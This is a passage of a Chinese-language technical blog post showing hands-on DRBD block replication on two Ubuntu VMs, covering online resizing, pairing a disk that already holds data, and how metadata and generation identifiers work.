/boot/efi</span><br><span class="line">├─vda2                    252:2    0    1G  0 part /boot</span><br><span class="line">└─vda3                    252:3    0 98.5G  0 part</span><br><span class="line">  └─ubuntu--vg-ubuntu--lv 253:0    0 49.3G  0 lvm  /</span><br></pre></td></tr></table></figure>

<h1 id="硬盘扩容情况"><a href="#硬盘扩容情况" class="headerlink" title="硬盘扩容情况"></a>硬盘扩容情况</h1><p>在ubu1上使用lvm构建底层硬盘存储数据，方便后续进行扩容操作。先创建一个20G的lv，然后创建drbd块设备，待同步完数据后对lv进行扩容10G操作，最后再对drbd进行扩容操作。(此间省略lvm相关操作)</p>
<p>ubu2上使用一个30G的scsi设备，不配置lvm，与ubu1上的lvm块设备构成一个异构环境。</p>
<p>ubu1:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">bob@ubu1:~/drbd_res$ cat /etc/drbd.d/r1.res</span><br><span class="line">resource r1 &#123;</span><br><span class="line">  on ubu1 &#123;</span><br><span class="line">    device    /dev/drbd2;</span><br><span class="line">    disk  /dev/drbd-vg/drbdlv1;</span><br><span class="line">    address   192.168.64.2:7792;</span><br><span class="line">    meta-disk internal;</span><br><span class="line">  &#125;</span><br><span class="line">  on ubu2 &#123;</span><br><span class="line">    device    /dev/drbd2;</span><br><span class="line">    disk  /dev/sdb;</span><br><span class="line">    address   192.168.64.4:7792;</span><br><span class="line">    meta-disk internal;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">bob@ubu1:~/drbd_res$ sudo drbdadm create-md r1</span><br><span class="line">initializing activity log</span><br><span class="line">initializing bitmap (640 KB) to all zero</span><br><span class="line">Writing meta data...</span><br><span class="line">New drbd meta data block successfully created.</span><br><span class="line">success</span><br><span class="line">bob@ubu1:~/drbd_res$ lsblk</span><br><span class="line">NAME                      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT</span><br><span class="line">loop0                       7:0    0 49.1M  1 loop /snap/core18/2681</span><br><span class="line">loop1                       7:1    0 49.1M  1 loop /snap/core18/2701</span><br><span class="line">loop2                       7:2    0 43.2M  1 loop /snap/snapd/17954</span><br><span class="line">loop3                       7:3    0 57.5M  1 loop /snap/core20/1332</span><br><span class="line">loop4                       7:4    0 43.2M  1 loop /snap/snapd/18363</span><br><span class="line">loop5                       7:5    0 60.7M  1 loop /snap/lxd/21843</span><br><span class="line">loop6                       7:6    0 91.9M  1 loop /snap/lxd/24065</span><br><span class="line">loop7                       7:7    0 59.1M  1 loop /snap/core20/1826</span><br><span class="line">sda                         8:0    0   20G  0 disk</span><br><span class="line">└─drbd1                   147:1    0   20G  1 disk</span><br><span class="line">sdb                         8:16   0   21G  0 disk</span><br><span class="line">└─drbd--vg-drbdlv1        253:1    0   20G  0 lvm</span><br><span class="line">sdc                         8:32   0   31G  0 disk</span><br><span class="line">sr0                        11:0    1  1.1G  0 rom</span><br><span class="line">vda                       252:0    0  100G  0 disk</span><br><span class="line">├─vda1                    252:1    0  512M  0 part /boot/efi</span><br><span class="line">├─vda2                    252:2    0    1G  0 part /boot</span><br><span class="line">└─vda3                    252:3    0 98.5G  0 part</span><br><span class="line">  └─ubuntu--vg-ubuntu--lv 253:0    0 49.3G  0 lvm  /</span><br><span class="line">bob@ubu1:~/drbd_res$ sudo drbdadm up r1</span><br><span class="line">bob@ubu1:~/drbd_res$ sudo drbdadm primary --force r1</span><br><span class="line">bob@ubu1:~/drbd_res$ cat /proc/drbd</span><br><span class="line">version: 8.4.11 (api:1/proto:86-101)</span><br><span class="line">srcversion: B438804C5AE8C84C95D0411</span><br><span class="line"></span><br><span class="line"> 1: cs:Connected ro:Secondary/Secondary ds:UpToDate/UpToDate C r-----</span><br><span class="line">    ns:0 nr:0 dw:0 dr:0 al:0 bm:0 lo:0 pe:0 ua:0 ap:0 ep:1 wo:f oos:0</span><br><span class="line"> 2: cs:SyncSource ro:Primary/Secondary ds:UpToDate/Inconsistent C r-----</span><br><span class="line">    ns:14496 nr:0 dw:0 dr:16616 al:8 bm:0 lo:0 pe:0 ua:0 ap:0 ep:1 wo:f oos:20956348</span><br><span class="line">        [&gt;....................] sync&#x27;ed:  0.1% (20464/20476)M</span><br><span class="line">        finish: 2:21:35 speed: 2,416 (2,416) K/sec</span><br></pre></td></tr></table></figure>

<p>ubu2:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">bob@ubu2:~$ lsblk</span><br><span class="line">NAME                      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT</span><br><span class="line">loop0                       7:0    0 49.1M  1 loop /snap/core18/2681</span><br><span class="line">loop1                       7:1    0 49.1M  1 loop /snap/core18/2701</span><br><span class="line">loop2                       7:2    0 60.7M  1 loop /snap/lxd/21843</span><br><span class="line">loop3                       7:3    0 91.9M  1 loop /snap/lxd/24065</span><br><span class="line">loop4                       7:4    0 57.5M  1 loop /snap/core20/1332</span><br><span class="line">loop5                       7:5    0 59.1M  1 loop /snap/core20/1826</span><br><span class="line">loop6                       7:6    0 43.2M  1 loop /snap/snapd/17954</span><br><span class="line">loop7                       7:7    0 43.2M  1 loop /snap/snapd/18363</span><br><span class="line">sda                         8:0    0   20G  0 disk</span><br><span class="line">└─drbd1                   147:1    0   20G  1 disk</span><br><span class="line">sdb                         8:16   0   32G  0 disk</span><br><span class="line">└─drbd2                   147:2    0   20G  1 disk</span><br><span class="line">sdc                         8:32   0   22G  0 disk</span><br><span class="line">sr0                        11:0    1  1.1G  0 rom</span><br><span class="line">vda                       252:0    0  100G  0 disk</span><br><span class="line">├─vda1                    252:1    0  512M  0 part /boot/efi</span><br><span class="line">├─vda2                    252:2    0    1G  0 part /boot</span><br><span class="line">└─vda3                    252:3    0 98.5G  0 part</span><br><span class="line">  └─ubuntu--vg-ubuntu--lv 253:0    0 49.3G  0 lvm  /</span><br></pre></td></tr></table></figure>

<p>目前drbd2对外提供的是一个20G的硬盘，接下来在不停drbd复制链接的情况下对其扩容10G（同样，省略lvm相关操作）</p>
<p>ubu1:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">bob@ubu1:~/drbd_res$ lsblk</span><br><span class="line">NAME                      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT</span><br><span class="line">loop0                       7:0    0 49.1M  1 loop /snap/core18/2681</span><br><span class="line">loop1                       7:1    0 49.1M  1 loop /snap/core18/2701</span><br><span class="line">loop2                       7:2    0 43.2M  1 loop /snap/snapd/17954</span><br><span class="line">loop3                       7:3    0 57.5M  1 loop /snap/core20/1332</span><br><span class="line">loop4                       7:4    0 43.2M  1 loop /snap/snapd/18363</span><br><span class="line">loop5                       7:5    0 60.7M  1 loop /snap/lxd/21843</span><br><span class="line">loop6                       7:6    0 91.9M  1 loop /snap/lxd/24065</span><br><span class="line">loop7                       7:7    0 59.1M  1 loop /snap/core20/1826</span><br><span class="line">sda                         8:0    0   20G  0 disk</span><br><span class="line">└─drbd1                   147:1    0   20G  1 disk</span><br><span class="line">sdb                         8:16   0   21G  0 disk</span><br><span class="line">└─drbd--vg-drbdlv1        253:1    0   30G  0 lvm</span><br><span class="line">  └─drbd2                 147:2    0   20G  0 disk</span><br><span class="line">sdc                         8:32   0   31G  0 disk</span><br><span class="line">└─drbd--vg-drbdlv1        253:1    0   30G  0 lvm</span><br><span class="line">  └─drbd2                 147:2    0   20G  0 disk</span><br><span class="line">sr0                        11:0    1  1.1G  0 rom</span><br><span class="line">vda                       252:0    0  100G  0 disk</span><br><span class="line">├─vda1                    252:1    0  512M  0 part /boot/efi</span><br><span class="line">├─vda2                    252:2    0    1G  0 part /boot</span><br><span class="line">└─vda3                    252:3    0 98.5G  0 part</span><br><span class="line">  └─ubuntu--vg-ubuntu--lv 253:0    0 49.3G  0 lvm  /</span><br><span class="line">bob@ubu1:~/drbd_res$ sudo drbdadm status r1</span><br><span class="line">r1 role:Primary</span><br><span class="line">  disk:UpToDate</span><br><span class="line">  peer role:Secondary</span><br><span class="line">    replication:SyncSource peer-disk:Inconsistent done:88.51</span><br><span class="line">bob@ubu1:~/drbd_res$ sudo drbdadm resize r1</span><br><span class="line">bob@ubu1:~/drbd_res$ lsblk</span><br><span class="line">NAME                      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT</span><br><span class="line">loop0                       7:0    0 49.1M  1 loop /snap/core18/2681</span><br><span class="line">loop1                       7:1    0 49.1M  1 loop /snap/core18/2701</span><br><span class="line">loop2                       7:2    0 43.2M  1 loop /snap/snapd/17954</span><br><span class="line">loop3                       7:3    0 57.5M  1 loop /snap/core20/1332</span><br><span class="line">loop4                       7:4    0 43.2M  1 loop /snap/snapd/18363</span><br><span class="line">loop5                       7:5    0 60.7M  1 loop /snap/lxd/21843</span><br><span class="line">loop6                       7:6    0 91.9M  1 loop /snap/lxd/24065</span><br><span class="line">loop7                       7:7    0 59.1M  1 loop /snap/core20/1826</span><br><span class="line">sda                         8:0    0   20G  0 disk</span><br><span class="line">└─drbd1                   147:1    0   20G  1 disk</span><br><span class="line">sdb                         8:16   0   21G  0 disk</span><br><span class="line">└─drbd--vg-drbdlv1        253:1    0   30G  0 lvm</span><br><span class="line">  └─drbd2                 147:2    0   30G  0 disk</span><br><span class="line">sdc                         8:32   0   31G  0 disk</span><br><span class="line">└─drbd--vg-drbdlv1        253:1    0   30G  0 lvm</span><br><span class="line">  └─drbd2                 147:2    0   30G  0 disk</span><br><span class="line">sr0                        11:0    1  1.1G  0 rom</span><br><span class="line">vda                       252:0    0  100G  0 disk</span><br><span class="line">├─vda1                    252:1    0  512M  0 part /boot/efi</span><br><span class="line">├─vda2                    252:2    0    1G  0 part /boot</span><br><span class="line">└─vda3                    252:3    0 98.5G  0 part</span><br><span class="line">  └─ubuntu--vg-ubuntu--lv 253:0    0 49.3G  0 lvm  /</span><br></pre></td></tr></table></figure>

<p>ubu2:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">bob@ubu2:~$ lsblk</span><br><span class="line">NAME                      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT</span><br><span class="line">loop0                       7:0    0 49.1M  1 loop /snap/core18/2681</span><br><span class="line">loop1                       7:1    0 49.1M  1 loop /snap/core18/2701</span><br><span class="line">loop2                       7:2    0 60.7M  1 loop /snap/lxd/21843</span><br><span class="line">loop3                       7:3    0 91.9M  1 loop /snap/lxd/24065</span><br><span class="line">loop4                       7:4    0 57.5M  1 loop /snap/core20/1332</span><br><span class="line">loop5                       7:5    0 59.1M  1 loop /snap/core20/1826</span><br><span class="line">loop6                       7:6    0 43.2M  1 loop /snap/snapd/17954</span><br><span class="line">loop7                       7:7    0 43.2M  1 loop /snap/snapd/18363</span><br><span class="line">sda                         8:0    0   20G  0 disk</span><br><span class="line">└─drbd1                   147:1    0   20G  1 disk</span><br><span class="line">sdb                         8:16   0   32G  0 disk</span><br><span class="line">└─drbd2                   147:2    0   30G  1 disk</span><br><span class="line">sdc                         8:32   0   22G  0 disk</span><br><span class="line">sr0                        11:0    1  1.1G  0 rom</span><br><span class="line">vda                       252:0    0  100G  0 disk</span><br><span class="line">├─vda1                    252:1    0  512M  0 part /boot/efi</span><br><span class="line">├─vda2                    252:2    0    1G  0 part /boot</span><br><span class="line">└─vda3                    252:3    0 98.5G  0 part</span><br><span class="line">  └─ubuntu--vg-ubuntu--lv 253:0    0 49.3G  0 lvm  /</span><br></pre></td></tr></table></figure>

<p>使用<code>drbdadm resize r1</code>完成对<code>r1</code>资源的扩容操作。</p>
<h1 id="硬盘存在有效数据情况"><a href="#硬盘存在有效数据情况" class="headerlink" title="硬盘存在有效数据情况"></a>硬盘存在有效数据情况</h1><p>ubu1和ubu2上分别创建了两个硬盘，一个20G存drbd的meta-data，一个30G用于存drbd的数据。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">bob@ubu1:~/drbd_res$ cat r2.res</span><br><span class="line">resource r2 &#123;</span><br><span class="line">  on ubu1 &#123;</span><br><span class="line">    device    /dev/drbd3;</span><br><span class="line">    disk  /dev/sdc;</span><br><span class="line">    address   192.168.64.2:7793;</span><br><span class="line">    meta-disk /dev/sdb;</span><br><span class="line">  &#125;</span><br><span class="line">  on ubu2 &#123;</span><br><span class="line">    device    /dev/drbd3;</span><br><span class="line">    disk  /dev/sdb;</span><br><span class="line">    address   192.168.64.4:7793;</span><br><span class="line">    meta-disk /dev/sdc;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先对ubu1上的数据盘<code>sdc</code>创建文件系统，并写入数据。然后再做drbd pair。</p>
<p>ubu1:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">bob@ubu1:~/drbd_res$ sudo mkfs.ext4 /dev/sdc</span><br><span class="line">mke2fs 1.45.5 (07-Jan-2020)</span><br><span class="line">Discarding device blocks: done</span><br><span class="line">Creating filesystem with 8126464 4k blocks and 2031616 inodes</span><br><span class="line">Filesystem UUID: 656f1b08-77a2-4488-acb1-f25ff616b257</span><br><span class="line">Superblock backups stored on blocks:</span><br><span class="line">    32768, 98304, 163840, 229376, 294912, 819200, 884736, 1605632, 2654208,</span><br><span class="line">    4096000, 7962624</span><br><span class="line"></span><br><span class="line">Allocating group tables: done</span><br><span class="line">Writing inode tables: done</span><br><span class="line">Creating journal (32768 blocks): done</span><br><span class="line">Writing superblocks and filesystem accounting information: done</span><br><span class="line"></span><br><span class="line">bob@ubu1:~/drbd_res$ sudo mount /dev/sdc /mnt/</span><br><span class="line">bob@ubu1:~/drbd_res$ echo &quot;Hi, bob&quot; &gt; /mnt/bob.txt</span><br><span class="line">bob@ubu1:~/drbd_res$ sudo umount /mnt</span><br><span class="line">bob@ubu1:~/drbd_res$ sudo drbdadm create-md r2</span><br><span class="line">md_offset 0</span><br><span class="line">al_offset 4096</span><br><span class="line">bm_offset 36864</span><br><span class="line"></span><br><span class="line">Found some data</span><br><span class="line"></span><br><span class="line"> ==&gt; This might destroy existing data! &lt;==</span><br><span class="line"></span><br><span class="line">Do you want to proceed?</span><br><span class="line">[need to type &#x27;yes&#x27; to confirm] yes</span><br><span class="line"></span><br><span class="line">initializing activity log</span><br><span class="line">initializing bitmap (672 KB) to all zero</span><br><span class="line">Writing meta data...</span><br><span class="line">New drbd meta data block successfully created.</span><br><span class="line">success</span><br><span class="line">bob@ubu1:~/drbd_res$ sudo drbdadm up r2</span><br><span class="line">bob@ubu1:~/drbd_res$ sudo drbdadm primary --force r2</span><br><span class="line">bob@ubu1:~/drbd_res$ cat /proc/drbd</span><br><span class="line">version: 8.4.11 (api:1/proto:86-101)</span><br><span class="line">srcversion: B438804C5AE8C84C95D0411</span><br><span class="line"></span><br><span class="line"> 1: cs:Connected ro:Secondary/Secondary ds:UpToDate/UpToDate C r-----</span><br><span class="line">    ns:0 nr:0 dw:0 dr:0 al:0 bm:0 lo:0 pe:0 ua:0 ap:0 ep:1 wo:f oos:0</span><br><span class="line"></span><br><span class="line"> 3: cs:SyncSource ro:Primary/Secondary ds:UpToDate/Inconsistent C r-----</span><br><span class="line">    ns:130656 nr:0 dw:0 dr:131328 al:8 bm:0 lo:0 pe:4 ua:0 ap:0 ep:1 wo:f oos:32376640</span><br><span class="line">        [&gt;....................] sync&#x27;ed:  0.5% (31616/31744)M</span><br><span class="line">        finish: 1:14:56 speed: 7,176 (7,176) K/sec</span><br></pre></td></tr></table></figure>

<p>ubu2:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bob@ubu2:~$ sudo drbdadm create-md r2</span><br><span class="line">initializing activity log</span><br><span class="line">initializing bitmap (704 KB) to all zero</span><br><span class="line">Writing meta data...</span><br><span class="line">New drbd meta data block successfully created.</span><br><span class="line">success</span><br></pre></td></tr></table></figure>

<p>此时drbd pair已经创建好了，<code>drbd3</code>也已经创建完成，直接挂载<code>drbd3</code>查看数据是否依然还在</p>
<p>ubu1:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">bob@ubu1:~/drbd_res$ lsblk</span><br><span class="line">NAME                      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT</span><br><span class="line">loop0                       7:0    0 49.1M  1 loop /snap/core18/2681</span><br><span class="line">loop1                       7:1    0 49.1M  1 loop /snap/core18/2701</span><br><span class="line">loop2                       7:2    0 43.2M  1 loop /snap/snapd/17954</span><br><span class="line">loop3                       7:3    0 57.5M  1 loop /snap/core20/1332</span><br><span class="line">loop4                       7:4    0 43.2M  1 loop /snap/snapd/18363</span><br><span class="line">loop5                       7:5    0 60.7M  1 loop /snap/lxd/21843</span><br><span class="line">loop6                       7:6    0 91.9M  1 loop /snap/lxd/24065</span><br><span class="line">loop7                       7:7    0 59.1M  1 loop /snap/core20/1826</span><br><span class="line">sda                         8:0    0   20G  0 disk</span><br><span class="line">└─drbd1                   147:1    0   20G  1 disk</span><br><span class="line">sdb                         8:16   0   21G  0 disk</span><br><span class="line">└─drbd3                   147:3    0   31G  0 disk</span><br><span class="line">sdc                         8:32   0   31G  0 disk</span><br><span class="line">└─drbd3                   147:3    0   31G  0 disk</span><br><span class="line">sr0                        11:0    1  1.1G  0 rom</span><br><span class="line">vda                       252:0    0  100G  0 disk</span><br><span class="line">├─vda1                    252:1    0  512M  0 part /boot/efi</span><br><span class="line">├─vda2                    252:2    0    1G  0 part /boot</span><br><span class="line">└─vda3                    252:3    0 98.5G  0 part</span><br><span class="line">  └─ubuntu--vg-ubuntu--lv 253:0    0 49.3G  0 lvm  /</span><br><span class="line">bob@ubu1:~/drbd_res$ sudo mount /dev/drbd3 /mnt/</span><br><span class="line">bob@ubu1:~/drbd_res$ ls /mnt/</span><br><span class="line">bob.txt  lost+found</span><br><span class="line">bob@ubu1:~/drbd_res$ cat /mnt/bob.txt</span><br><span class="line">Hi, Bob</span><br></pre></td></tr></table></figure>

<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>DRBD（Distributed Replicated Block Device）是一个基于内核模块的高可用性（HA）软件，它在两个或多个节点之间复制块设备数据，使得在其中一个节点发生故障时，其他节点可以接管工作并保持服务可用性。</p>
<p><img src="/images/drbd/drbd-in-kernel.png" alt="drbd-in-kernel.png"></p>
<p>DRBD的工作原理：</p>
<ol>
<li>DRBD将每个块设备划分为数据和元数据两个区域。元数据包含块设备的状态信息和同步状态，而数据包含实际的用户数据。</li>
<li>DRBD使用一个专用的网络通信通道（通常是TCP &#x2F; IP）来在节点之间传输数据。当发生写操作时，数据被写入本地节点的数据区域，并通过网络传输到远程节点，然后在远程节点上写入远程节点的数据区域。</li>
<li>DRBD还使用一种名为“生成标识符”（Generation Identifiers）的机制来检测节点间的数据同步状态。每个生成标识符对应一个生成版本，节点在进行数据同步时，使用生成标识符来判断版本是否相同。</li>
<li>DRBD提供了多种数据同步策略，例如全同步，增量同步和快速同步，以便在不同的应用场景下获得最佳的性能和数据完整性。</li>
<li>DRBD支持不同的工作模式，如协议A和协议C，用于适应不同的应用需求。协议A用于异步复制，适用于数据传输速度较慢的场景，而协议C则用于同步复制，适用于对数据完整性有较高要求的场景。</li>
</ol>
<h2 id="DRBD-Metadata"><a href="#DRBD-Metadata" class="headerlink" title="DRBD Metadata"></a>DRBD Metadata</h2><p>DRBD元数据包括：</p>
<ul>
<li>DRBD容量</li>
<li>GI(Generation Identifiers)</li>
<li>Activity Log</li>
<li>Quick-sync Bitmap</li>
</ul>
<h3 id="Internal-meta-data"><a href="#Internal-meta-data" class="headerlink" title="Internal meta data"></a>Internal meta data</h3><p>资源配置成<code>internal</code>方式存储元数据，这意味着元数据将与底层实际存储的数据放在一起。它通过在设备末尾设置一个区域来专门存储元数据。</p>
<ul>
<li><p>优点<br>  由于元数据与实际数据密不可分，因此在硬盘发生故障时，管理员不需要采取任何特殊措施。元数据将随着实际数据丢失，并与实际数据一起恢复。</p>
</li>
<li><p>缺点<br>  如果底层设备是单个物理硬盘（而不是 RAID 集），则内部元数据可能会对写入吞吐量产生负面影响。应用程序发起的写请求的性能可能会触发 DRBD 中元数据的更新。如果元数据存储在同一磁盘上，则写操作可能会导致硬盘的写入&#x2F;读取头产生两次额外的移动。</p>
</li>
</ul>
<p>如果您计划将内部元数据与已经有需要保留的数据的现有底层设备一起使用，您必须考虑 DRBD 元数据所需的空间。另外，在创建 DRBD 资源时，新创建的元数据可能会覆盖底层设备末尾的数据，从而可能破坏现有的文件。<br>为了避免这种情况发生，有三种解决方法：</p>
<ol>
<li>扩容底层硬盘，保证其有足够的容量存储元数据。</li>
<li>缩小已存在于底层硬盘的数据的大小，这需要文件系统的支持。</li>
<li>使用external meta data 替代。</li>
</ol>
<h3 id="External-meta-data"><a href="#External-meta-data" class="headerlink" title="External meta data"></a>External meta data</h3><p>External meta data 只是简单地存储在一个与包含生产数据的设备不同的、专用的块设备中。</p>
<ul>
<li><p>优势<br>  对于某些写操作，使用外部元数据可以产生略微改善的延迟行为。</p>
</li>
<li><p>缺点<br>  元数据与实际生产数据并不密不可分。这意味着，在硬件故障仅破坏生产数据（但不破坏 DRBD 元数据）的情况下，需要手动干预，以实现从存活的节点对新替换磁盘的全面数据同步。</p>
</li>
</ul>
<p>如果满足以下所有条件，使用外部元数据也是唯一可行的选择，您正在使用 DRBD 复制一个已经包含您希望保留的数据的现有设备，且该现有设备不支持扩大容量，且该设备上的现有文件系统不支持缩小容量。</p>
<h2 id="Generation-Identifiers"><a href="#Generation-Identifiers" class="headerlink" title="Generation Identifiers"></a>Generation Identifiers</h2><p>DRBD 使用Generation Identifiers（GIs）来标识“复制数据代”。数据同步是基于GI实现的。GI是一个递增的整数，每个DRBD设备都有自己的GI计数器，用于记录本地和远程节点上最新的GI。当DRBD设备从远程节点读取数据时，它会比较本地和远程节点上的GI值。如果本地GI值低于远程节点上的GI值，那么DRBD设备会自动启动数据同步，将远程节点上的数据复制到本地节点上。</p>
<p>该GI在DRBD的内部机制如下：</p>
<ul>
<li>确定这两个节点是否实际上是同一集群的成员（而不是意外连接的两个节点）</li>
<li>确定后台重新同步的方向（如果有必要）</li>
<li>确定是否需要进行完全重新同步或是否仅需要进行部分重新同步</li>
<li>标识脑裂</li>
</ul>
<p>分裂大脑是指当DRBD设备与另一个节点失去联系时发生的问题。在这种情况下，每个节点都可能认为自己是唯一的“活动”节点，并开始独立地写入数据。当两个节点再次连接时，它们可能会发现它们的数据不同步。GI用于解决这个问题。当两个节点重新连接时，它们比较彼此的GI值。如果GI值相同，则两个节点处于相同的“代”，可以继续同步数据。如果GI值不同，则两个节点处于不同的“代”，需要手动解决分裂大脑问题，通常需要将其中一个节点上的数据进行回滚。</p>
<h3 id="数据代-Data-generations"><a href="#数据代-Data-generations" class="headerlink" title="数据代(Data generations)"></a>数据代(Data generations)</h3><p>以下情况下标记新的数据生成开始：</p>
<ol>
<li>初始设备全量同步时</li>
<li>断开的资源切换到主要角色时</li>
<li>资源在主要角色下线时</li>
</ol>
<p>因此，我们可以总结出，每当资源处于已连接的连接状态，并且两个节点的磁盘状态都为UpToDate时，两个节点上的当前数据生成相同。<br>反之亦然。请注意，当前实现使用最低位来编码节点的角色（主&#x2F;辅）。因此，即使被认为具有相同的数据生成，不同节点上的最低位也可能不同。</p>
<p>每个新的数据生成由8字节的通用唯一标识符（UUID）标识。</p>
<h3 id="GI元组-The-generation-identifier-tuple"><a href="#GI元组-The-generation-identifier-tuple" class="headerlink" title="GI元组(The generation identifier tuple)"></a>GI元组(The generation identifier tuple)</h3><p>BD在本地资源元数据中保存了有关当前和历史数据生成的四个信息：</p>
<ol>
<li>当前UUID (Current UUID)<br> 这是从本地节点的视角看到的当前数据生成的生成标识符。当资源已连接并且同步完成时，当前UUID在节点之间是相同的。</li>
<li>位图UUID (Bitmap UUID)<br> 这是用于跟踪在断开连接模式下磁盘同步位图中的更改的生成的UUID。与磁盘同步位图本身一样，该标识符仅在断开连接模式下才相关。如果资源已连接，则此UUID始终为空（零）。</li>
<li>两个历史UUID (Historical UUIDs)<br> 它们是当前数据生成之前的两个数据生成的标识符。</li>
</ol>
